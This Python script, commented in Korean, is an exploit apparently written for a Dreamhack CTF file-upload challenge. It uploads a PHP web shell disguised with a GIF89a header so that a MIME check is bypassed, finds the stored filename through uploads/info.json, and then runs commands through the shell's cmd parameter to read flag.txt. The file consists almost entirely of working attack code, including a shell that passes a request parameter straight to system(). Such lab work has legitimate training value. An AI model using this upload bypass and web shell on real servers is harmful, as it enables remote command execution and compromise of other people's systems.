import requests
import json
import sys

# 타겟 서버 URL (필요시 수정하세요)
target_url = "http://host3.dreamhack.games:21278"
upload_url = f"{target_url}/upload.php"
info_url = f"{target_url}/uploads/info.json"

print(f"[*] 타겟 URL 설정 완료: {target_url}")

# 1. 페이로드(웹 쉘) 준비
# 파일의 시작을 GIF 매직 바이트(GIF89a)로 설정하여 finfo_file()을 우회합니다.
# 디버깅이 편하도록 PHP 쉘 내에서도 정보 출력문을 추가했습니다.
payload_content = b"""GIF89a
<?php
  echo "\n[====== PHP SHELL DEBUG INFO ======]\n";
  echo "Current User: " . shell_exec('whoami') . "\n";
  echo "Current Path: " . shell_exec('pwd') . "\n";
  echo "[====== COMMAND EXECUTION ======]\n";
  
  if(isset($_GET['cmd'])) {
      system($_GET['cmd']);
  } else {
      echo "No command provided. Use ?cmd=... in URL.";
  }
?>"""

# 서버로 전송할 Multipart-form 데이터 구성
files = {
    'file': ('exploit.php', payload_content, 'application/octet-stream')
}
data = {
    'title': 'Exploit Payload',
    'description': 'Bypassing upload filter with GIF header'
}

print("\n[*] 단계 1: 파일 업로드 시도 중...")
print(f"  - 업로드 대상 파일명: exploit.php")
print(f"  - 페이로드 크기: {len(payload_content)} bytes")

try:
    upload_res = requests.post(upload_url, files=files, data=data)
    print(f"  - HTTP 응답 상태 코드: {upload_res.status_code}")
    print(f"  - 응답 헤더: {dict(upload_res.headers)}")
except Exception as e:
    print(f"[-] 업로드 중 에러 발생: {e}")
    sys.exit(1)

# 2. 업로드된 실제 파일명 알아내기
# 서버는 파일명 앞에 시간을 붙여 랜덤하게 저장하므로 info.json을 조회해야 합니다.
print("\n[*] 단계 2: 저장된 파일명 확인 (info.json 조회)...")
try:
    info_res = requests.get(info_url)
    print(f"  - info.json 응답 상태 코드: {info_res.status_code}")
    
    info_data = info_res.json()
    print(f"  - 서버에 등록된 총 파일 수: {len(info_data)}")
    
    # 리스트의 가장 마지막 요소가 방금 업로드한 파일입니다.
    latest_file = info_data[-1]
    uploaded_filename = latest_file['filename']
    
    print(f"  - [+] 찾은 실제 파일명: {uploaded_filename}")
    print(f"  - 서버가 인식한 MIME 타입: {latest_file['mime_type']}")
except json.JSONDecodeError:
    print(f"[-] info.json 파싱 실패. 응답이 JSON 형식이 아닙니다.")
    print(f"[-] 서버 응답 텍스트(앞부분): {info_res.text[:300]}")
    sys.exit(1)
except Exception as e:
    print(f"[-] 파일명 확인 중 에러 발생: {e}")
    sys.exit(1)

# 3. 업로드된 웹 쉘에 접근하여 명령어 실행
print("\n[*] 단계 3: 웹 쉘 접근 및 플래그 획득 시도...")
shell_url = f"{target_url}/uploads/{uploaded_filename}"

# CTF에서 주로 사용되는 플래그 경로들을 시도합니다.
cmd_to_run = "cat ../flag.txt || ls -la ../"
print(f"  - 쉘 접근 URL: {shell_url}")
print(f"  - 실행할 명령어: {cmd_to_run}")

try:
    shell_res = requests.get(shell_url, params={'cmd': cmd_to_run})
    print(f"  - 쉘 응답 상태 코드: {shell_res.status_code}")
    
    print(f"\n[+] ================== 서버 응답 결과 ==================")
    print(shell_res.text)
    print(f"=========================================================\n")
    
except Exception as e:
    print(f"[-] 웹 쉘 실행 중 에러 발생: {e}")